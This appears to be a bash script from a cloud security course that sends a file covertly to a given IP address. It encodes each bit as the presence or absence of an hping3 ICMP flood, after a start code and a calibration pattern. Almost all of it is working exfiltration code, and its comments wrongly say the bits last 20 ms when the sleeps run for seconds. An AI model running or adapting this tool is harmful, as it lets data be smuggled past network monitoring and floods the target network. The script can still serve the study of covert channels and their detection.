#!/bin/bash

################################################################################
#Mason Hemmel
#Cloud Security
#File to Network Covert Channel: fton
#
#This script reads a file in bit by bit, then transmits that file through a
#networking channel. It does this by broadcasting a great deal of traffic for
#20ms for every 1 while doing nothing for 20ms for every 0.
#
#Args
#1 = filename
#2 = destination ip
################################################################################
#Sanity checks for arguments and files

#check that args are valid
if [ $# -lt 2 ]; then
    echo "Usage: $0 filename destination_ip"
    exit
fi

#check that file actually exists
if [ ! -e $1 ]; then
    echo "File $1 does not exist!"
    exit
fi
################################################################################
#Sleep, then broadcast "start code" of eight 1s
#then send 1010... for measuring where our zeroes are
#TODO: Make the above a better explanation

#Set up color printing
RED='\033[0;31m'
NC='\033[0m'

printf "${RED}Waking from sleep: now beginning to broadcast start code\n${NC}"

hping3 -1 -d 3000 --flood $2 &
sleep 48
kill $!
printf "${RED}Start code sent! Now beginning noise generation for measurement.\n${NC}"

SENTINEL=0
#send 1/0 20 times. The final sleep takes care of our window and our zero
while [ $SENTINEL -lt 20 ]; do
    sleep 2
    hping3 -1 -d 3000 --flood $2 &
    sleep 2
    kill $!
    sleep 8
    let SENTINEL=SENTINEL+1
done
printf "${RED}Measurement complete, now beginning message transmission\n${NC}"
################################################################################
#Translate our file-to-be-transmitted to a set of bits, then network it

#figure out the full length of the file in bytes 
TOTAL_BYTES=$(du -b $1 | cut -f1)

SENTINEL=1
while [ $SENTINEL -lt $(($TOTAL_BYTES)) ]; do
    #using head, print all bytes until byte we are looking for, then
    #using tail extract only that byte
    CURRENT_BYTE=$(head -c $SENTINEL $1 | tail -c 1)

    #CURRENT_BYTE is the current byte in character form, but we actually
    #need it in numerical form in order to play all the fun bit-shifting
    #games with it that are needed later.
    #To effect this change, we will use printf to implicity convert it
    #into a digit
    NUMERICAL_CURRENT_BYTE=$(printf "%d" \'$CURRENT_BYTE)

    #mask out each bit, then network appropriately given its value
    #we network the bits out from most significant to least significant
    MASK_SENTINEL=7
    while [ $MASK_SENTINEL -gt -1 ]; do
	#bitmasking out the desired bit. we don't need to bother
	#shifting it to the ones place, since anything greater than a
	#zero can be automatically assumed to be a one
	#We get weird results when we mask 1 left by zero, so we simply hard
	#set the mask in that case
	if [ $MASK_SENTINEL -eq 0 ]; then
	    MASK=1
	else
	    MASK=$((1 << MASK_SENTINEL))
	fi
	
	MASKED_BYTE=$((NUMERICAL_CURRENT_BYTE & MASK))

	#network a one; i.e. flood network for 20ms
	if [ $MASKED_BYTE -gt 0 ]; then
            sleep 2
	    hping3 -1 -d 3000 --flood $2 &
	    sleep 2
            kill $!
            sleep 2

        #nework a zero; i.e. sleep for ms
	else
	    sleep 6
	fi
	
	let MASK_SENTINEL-=1
    done
    
    let SENTINEL+=1
done

echo "Message sent; all should be good!"
